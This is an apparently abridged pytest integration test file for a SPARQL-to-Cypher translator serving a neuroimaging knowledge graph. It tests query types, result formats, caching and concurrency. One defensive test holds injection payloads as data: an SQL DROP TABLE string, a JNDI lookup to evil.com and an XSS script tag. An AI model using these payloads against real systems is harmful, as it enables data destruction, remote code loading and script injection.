...
from brain_researcher.services.neurokg.sparql.translator import SPARQLToCypherTranslator
...
class TestSPARQLEndpointIntegration:
    ...
    def test_basic_select_query_integration(self, app, sparql_endpoint, mock_neo4j_db):
        ...
        with patch('brain_researcher.services.neurokg.sparql.endpoint.parseQuery') as mock_parse:
            ...
            sparql_endpoint.translator._extract_select_variables = Mock(return_value=['?region', '?activation'])
            sparql_endpoint.translator._extract_where_patterns = Mock(return_value=[
                ('?region', 'https://neurokg.org/activatesRegion', '?activation')
            ])
            sparql_endpoint.translator._extract_filters = Mock(return_value=[])
            sparql_endpoint.translator._extract_optional_patterns = Mock(return_value=[])
            ...
            with app.test_client() as client:
                response = client.get('/sparql?query=SELECT ?region ?activation WHERE { ?region <https://neurokg.org/activatesRegion> ?activation }')
    ...
    def test_construct_query_integration(self, app, sparql_endpoint, mock_neo4j_db):
        ...
        mock_neo4j_db._run.return_value = [
            {
                'subject': 'https://neurokg.org/brain_region_001',
                'predicate': 'https://neurokg.org/activatesRegion',
                'object': 'https://neurokg.org/activation_001'
            }
        ]
        ...
        with patch('brain_researcher.services.neurokg.sparql.endpoint.parseQuery') as mock_parse:
            ...
            sparql_endpoint.translator._extract_construct_patterns = Mock(return_value=[])
            sparql_endpoint.translator._extract_where_patterns = Mock(return_value=[
                ('?region', 'https://neurokg.org/activatesRegion', '?activation')
            ])
            ...
            with app.test_client() as client:
                response = client.get('/sparql?query=CONSTRUCT { ?region <https://neurokg.org/activatesRegion> ?activation } WHERE { ?region <https://neurokg.org/activatesRegion> ?activation }')
    ...
    def test_ask_query_integration(self, app, sparql_endpoint, mock_neo4j_db):
        ...
        with patch('brain_researcher.services.neurokg.sparql.endpoint.parseQuery') as mock_parse:
            ...
            with app.test_client() as client:
                response = client.get('/sparql?query=ASK { ?region <https://neurokg.org/activatesRegion> ?activation }')
    ...
    def test_complex_select_with_filters(self, app, sparql_endpoint, mock_neo4j_db):
        ...
        mock_neo4j_db._run.return_value = [
            {'region': 'https://neurokg.org/cortex', 'intensity': 0.9},
            {'region': 'https://neurokg.org/hippocampus', 'intensity': 0.7}
        ]
        ...
        with patch('brain_researcher.services.neurokg.sparql.endpoint.parseQuery') as mock_parse:
            ...
            sparql_endpoint.translator._extract_select_variables = Mock(return_value=['?region', '?intensity'])
            sparql_endpoint.translator._extract_where_patterns = Mock(return_value=[
                ('?region', 'https://neurokg.org/hasIntensity', '?intensity')
            ])
            sparql_endpoint.translator._extract_filters = Mock(return_value=['?intensity > 0.5'])
            sparql_endpoint.translator._extract_optional_patterns = Mock(return_value=[])
            sparql_endpoint.translator._extract_order_by = Mock(return_value='DESC(?intensity)')
            ...
            sparql_endpoint.translator._translate_filter = Mock(return_value=('intensity > $threshold', {'threshold': 0.5}))
    ...
    def test_query_caching_integration(self, app, sparql_endpoint, mock_neo4j_db):
        ...
        with patch('brain_researcher.services.neurokg.sparql.endpoint.parseQuery') as mock_parse:
            ...
            sparql_endpoint.translator._extract_select_variables = Mock(return_value=['?s'])
            sparql_endpoint.translator._extract_where_patterns = Mock(return_value=[
    ...
    @pytest.mark.integration
    def test_multiple_result_formats_integration(self, app, sparql_endpoint, mock_neo4j_db):
        ...
        with patch('brain_researcher.services.neurokg.sparql.endpoint.parseQuery') as mock_parse:
            ...
            sparql_endpoint.translator._extract_select_variables = Mock(return_value=['?s', '?p', '?o'])
            sparql_endpoint.translator._extract_where_patterns = Mock(return_value=[
                ('?s', '?p', '?o')
            ])
            sparql_endpoint.translator._extract_filters = Mock(return_value=[])
            ...
            with app.test_client() as client:
                ...
                # Test JSON format
                response_json = client.get(f'/sparql?query={query}', headers={'Accept': 'application/sparql-results+json'})
                ...
                # Test XML format
                response_xml = client.get(f'/sparql?query={query}', headers={'Accept': 'application/sparql-results+xml'})
    ...
    def test_performance_metrics_integration(self, app, sparql_endpoint, mock_neo4j_db):
        ...
        with patch('brain_researcher.services.neurokg.sparql.endpoint.parseQuery') as mock_parse:
            ...
            sparql_endpoint._get_query_type = Mock(return_value='SELECT')
            sparql_endpoint.translator._extract_select_variables = Mock(return_value=['?s'])
            sparql_endpoint.translator._extract_where_patterns = Mock(return_value=[('?s', '?p', '?o')])
            sparql_endpoint.translator._extract_filters = Mock(return_value=[])
            sparql_endpoint.translator._extract_optional_patterns = Mock(return_value=[])
            sparql_endpoint.translator._extract_order_by = Mock(return_value=None)
            sparql_endpoint.translator._extract_limit = Mock(return_value=None)
            ...
            with app.test_client() as client:
                ...
                for i in range(3):
                    response = client.get(f'/sparql?query=SELECT * WHERE {{ ?s ?p ?o{i} }}')
                    assert response.status_code == 200
                ...
                assert metrics['avg_execution_time'] > 0.05  # Should reflect the artificial delay
...
class TestSPARQLTranslatorIntegration:
    ...
    @pytest.fixture
    def translator(self):
        return SPARQLToCypherTranslator(base_uri="https://neurokg.org/")
    
    @pytest.mark.integration
    def test_neuroimaging_query_translation(self, translator):
        """Test translation of neuroimaging-specific SPARQL queries"""
        
        with patch('brain_researcher.services.neurokg.sparql.translator.parseQuery') as mock_parse:
            mock_parsed = Mock()
            mock_parse.return_value = mock_parsed
            
            # Mock a brain activation query
            translator._get_query_type = Mock(return_value='SELECT')
            translator._extract_select_variables = Mock(return_value=['?region', '?task', '?activation'])
            translator._extract_where_patterns = Mock(return_value=[
                ('?region', 'https://neurokg.org/activatedBy', '?task'),
                ('?region', 'https://neurokg.org/hasActivation', '?activation')
            ])
    ...
    def test_brain_region_hierarchy_query(self, translator):
        ...
        with patch('brain_researcher.services.neurokg.sparql.translator.parseQuery') as mock_parse:
            ...
            translator._get_query_type = Mock(return_value='SELECT')
            translator._extract_select_variables = Mock(return_value=['?region', '?parent'])
            translator._extract_where_patterns = Mock(return_value=[
                ('?region', 'https://neurokg.org/partOf', '?parent'),
                ('?parent', 'http://www.w3.org/1999/02/22-rdf-syntax-ns#type', 'https://neurokg.org/BrainRegion')
            ])
            translator._extract_filters = Mock(return_value=[])
            translator._extract_optional_patterns = Mock(return_value=[])
            translator._extract_order_by = Mock(return_value=None)
    ...
    def test_complex_construct_query_translation(self, translator):
        ...
        with patch('brain_researcher.services.neurokg.sparql.translator.parseQuery') as mock_parse:
            ...
            translator._extract_construct_patterns = Mock(return_value=[
                ('?study', 'https://neurokg.org/hasResult', '?result'),
                ('?result', 'https://neurokg.org/activatesRegion', '?region')
            ])
            translator._extract_where_patterns = Mock(return_value=[
                ('?study', 'https://neurokg.org/usesTask', '?task'),
                ('?task', 'http://www.w3.org/2000/01/rdf-schema#label', '"working memory"')
            ])
    ...
    def test_multilingual_literal_handling(self, translator):
        ...
        patterns = [
            ...
            ('?region', 'https://neurokg.org/volume', '"1250.5"^^<http://www.w3.org/2001/XMLSchema#float>'),
            ('?region', 'https://neurokg.org/description', '"région cérébrale"@fr')
        ]
    ...
    def test_parameter_injection_prevention(self, translator):
        ...
        malicious_patterns = [
            ('?s', 'https://neurokg.org/test', '"; DROP TABLE nodes; --"'),
            ('?s', 'https://neurokg.org/test', '"${jndi:ldap://evil.com}"'),
            ('?s', 'https://neurokg.org/test', '"<script>alert(1)</script>"')
        ]
    ...
    def test_large_query_handling(self, translator):
        ...
        with patch('brain_researcher.services.neurokg.sparql.translator.parseQuery') as mock_parse:
            ...
            for i in range(50):  # 50 triple patterns
                large_patterns.append((f'?s{i}', f'https://neurokg.org/pred{i}', f'?o{i}'))
            
            translator._get_query_type = Mock(return_value='SELECT')
            translator._extract_select_variables = Mock(return_value=[f'?s{i}' for i in range(50)])
        ...
        def translate_worker(worker_id):
            try:
                with patch('brain_researcher.services.neurokg.sparql.translator.parseQuery') as mock_parse:
                    ...
                    translator._get_query_type = Mock(return_value='SELECT')
                    translator._extract_select_variables = Mock(return_value=[f'?var{worker_id}'])
                    translator._extract_where_patterns = Mock(return_value=[
                        (f'?s{worker_id}', f'https://neurokg.org/pred{worker_id}', f'?o{worker_id}')
                    ])
                    translator._extract_filters = Mock(return_value=[])
                    translator._extract_optional_patterns = Mock(return_value=[])
                    translator._extract_order_by = Mock(return_value=None)
